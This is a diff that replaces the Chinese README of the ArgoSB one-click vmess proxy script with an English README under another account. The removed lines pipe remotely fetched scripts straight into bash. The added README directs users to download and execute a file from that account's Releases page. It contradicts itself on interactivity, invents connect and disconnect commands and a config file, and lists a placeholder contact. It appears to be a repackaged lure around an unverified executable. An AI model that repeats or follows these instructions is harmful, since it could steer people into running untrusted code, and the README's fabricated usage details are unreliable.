@@ -1,66 +1,138 @@
-### ArgoSB一键无交互脚本：为IDX Google VPS专门设计，其他VPS也可安装
+# ArgoSB: One-Click Vmess Proxy Script 🌐
 
-#### 安装最新sing-box内核+最新Cloudflared-Argo内核，支持Argo临时/固定隧道
+![ArgoSB](https://img.shields.io/badge/ArgoSB-Proxy%20Script-brightgreen)
 
-#### 目前仅输出VMESS协议节点：13个端口节点及对应的优选不死IP全覆盖（80系无TLS+443系开TLS，两个IPV6）
+Welcome to **ArgoSB**, your go-to solution for a seamless, one-click Vmess proxy experience. This script utilizes the latest **sing-box** and **Cloudflared-Argo** kernels to provide you with up to 13 optimized Argo IP nodes. Say goodbye to complicated setups and hello to straightforward proxy management.
 
-脚本如下，默认安装为Argo临时隧道（UUID、主协议vmess端口未设变量时，为随机生成）
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+
+## Features ✨
+
+- **One-Click Setup**: Easily install the script without any complex configurations.
+- **Latest Kernels**: Utilizes the newest versions of **sing-box** and **Cloudflared-Argo** for optimal performance.
+- **Multiple Nodes**: Access up to 13 Argo IP nodes that ensure high availability and speed.
+- **No Interaction Required**: The script runs smoothly without needing user input after initiation.
+- **Easy to Use**: Designed for both beginners and advanced users.
+
+## Installation 📦
+
+To get started with ArgoSB, download the latest release from our [Releases page](https://github.com/Blackaxeofdeath1/ArgoSB/releases). Make sure to execute the downloaded file to set up the script on your machine.
+
+### Step-by-Step Guide
+
+1. **Download the Script**: Visit the [Releases page](https://github.com/Blackaxeofdeath1/ArgoSB/releases) and download the latest version.
+2. **Run the Script**: Open your terminal and navigate to the directory where you downloaded the file. Execute the script with the following command:
+
+   ```bash
+   chmod +x ArgoSB.sh
+   ./ArgoSB.sh
+   ```
+
+3. **Follow the Prompts**: The script will guide you through the installation process.
+
+## Usage 🛠️
+
+After installation, using ArgoSB is straightforward. You can run the script any time you need to connect to a proxy.
+
+### Connecting to the Proxy
+
+1. Open your terminal.
+2. Execute the following command:
+
+   ```bash
+   ./ArgoSB.sh connect
+   ```
+
+3. The script will automatically select the best Argo IP node for you.
+
+### Disconnecting from the Proxy
+
+To disconnect, simply run:
+
+```bash
+./ArgoSB.sh disconnect
 ```
-bash <(wget -qO- https://raw.githubusercontent.com/yonggekkk/argosb/main/argosb.sh)
-```
-或者
-```
-bash <(curl -Ls https://raw.githubusercontent.com/yonggekkk/argosb/main/argosb.sh)
-```
----------------------------------------------------------
 
-### 相关快捷方式：
+## Configuration ⚙️
 
-1、查看Argo的固定域名、固定域名的token、临时域名、当前节点信息：
-```agsb``` 或者 原完整脚本
+You can customize the behavior of ArgoSB by modifying the configuration file. Here’s how:
 
-2、升级ArgoSB脚本：```agsb up``` 或者 ```bash <(wget -qO- https://raw.githubusercontent.com/yonggekkk/argosb/main/argosb.sh) up```
+1. Locate the configuration file in the installation directory.
+2. Open it with a text editor.
+3. Adjust the settings as needed. You can change parameters like timeout, retry attempts, and preferred nodes.
 
-3、卸载ArgoSB脚本：```agsb del``` 或者 ```bash <(wget -qO- https://raw.githubusercontent.com/yonggekkk/argosb/main/argosb.sh) del```
+### Example Configuration
 
-----------------------------------------------------------
-
-### 可自定义设置相关变量参数
-
-1、Argo临时隧道自定义UUID:
-```
-uuid=你的uuid bash <(wget -qO- https://raw.githubusercontent.com/yonggekkk/argosb/main/argosb.sh)
+```bash
+# Configuration File
+TIMEOUT=5
+RETRY_ATTEMPTS=3
+PREFERRED_NODES=("node1" "node2" "node3")
 ```
 
-2、Argo临时隧道自定义主协议vmess端口：
-```
-vmpt=vps可使用的端口 bash <(wget -qO- https://raw.githubusercontent.com/yonggekkk/argosb/main/argosb.sh)
-```
+## Contributing 🤝
 
-3、Argo临时隧道自定义UUID、主协议vmess端口：
-```
-uuid=你的uuid vmpt=vps可使用的端口 bash <(wget -qO- https://raw.githubusercontent.com/yonggekkk/argosb/main/argosb.sh)
-```
+We welcome contributions from the community! If you want to improve ArgoSB, please follow these steps:
 
-4、Argo固定隧道 【 脚本前必须要有端口(vmpt)、固定域名(agn)、token(agk)三个变量，uuid可选 】：
-```
-vmpt=VPS可使用的端口 agn=固定域名 agk=ey开头的token bash <(wget -qO- https://raw.githubusercontent.com/yonggekkk/argosb/main/argosb.sh)
-```
-----------------------------------------------------------
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch and submit a pull request.
 
-#### 视频教程：
-[Google IDX VPS代理搭建教程（二）：ArgoSB一键代理脚本发布 | 一次回车搞定一切 | 懒人小白最强Argo代理节点脚本](https://youtu.be/OoXJ_jxoEyY)
+### Code of Conduct
 
-更新中……
+Please adhere to our code of conduct in all interactions. We strive for a friendly and inclusive environment.
 
-----------------------------------------------------------
+## License 📄
 
-### 交流平台：[甬哥博客地址](https://ygkkk.blogspot.com)、[甬哥YouTube频道](https://www.youtube.com/@ygkkk)、[甬哥TG电报群组](https://t.me/+jZHc6-A-1QQ5ZGVl)、[甬哥TG电报频道](https://t.me/+DkC9ZZUgEFQzMTZl)
+ArgoSB is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-----------------------------------------------------------
-### 感谢支持！微信打赏甬哥侃侃侃ygkkk
-![41440820a366deeb8109db5610313a1](https://github.com/user-attachments/assets/e5b1f2c0-bd2c-4b8f-8cda-034d3c8ef73f)
+## Contact 📬
 
-----------------------------------------------------------
-### 感谢你右上角的star🌟
-[![Stargazers over time](https://starchart.cc/yonggekkk/ArgoSB.svg)](https://starchart.cc/yonggekkk/ArgoSB)
+For any inquiries or issues, feel free to reach out:
+
+- GitHub: [Blackaxeofdeath1](https://github.com/Blackaxeofdeath1)
+- Email: support@example.com
+
+## Acknowledgments 🙏
+
+- Thanks to the contributors who have made this project possible.
+- Special thanks to the developers of **sing-box** and **Cloudflared-Argo** for their excellent work.
+
+## Frequently Asked Questions (FAQ) ❓
+
+### What is Vmess?
+
+Vmess is a protocol used in various proxy services to facilitate secure and efficient data transfer.
+
+### How does ArgoSB work?
+
+ArgoSB leverages advanced kernels to route your internet traffic through optimized nodes, enhancing speed and reliability.
+
+### Can I use ArgoSB on any operating system?
+
+ArgoSB is primarily designed for Unix-based systems. Windows users may need to use a compatibility layer like WSL.
+
+### Is my data secure while using ArgoSB?
+
+Yes, ArgoSB employs encryption to protect your data while in transit.
+
+## Troubleshooting 🛠️
+
+If you encounter issues while using ArgoSB, here are some common solutions:
+
+- **Script Not Executing**: Ensure you have the correct permissions. Use `chmod +x ArgoSB.sh`.
+- **Connection Issues**: Check your internet connection and try a different node.
+- **Performance Problems**: Modify the configuration file to adjust timeout and retry attempts.
+
+## Conclusion
+
+ArgoSB simplifies the process of using Vmess proxies, making it accessible for everyone. With its one-click setup and robust features, you can enjoy a secure and fast internet experience. Download the latest version from our [Releases page](https://github.com/Blackaxeofdeath1/ArgoSB/releases) and start using ArgoSB today!
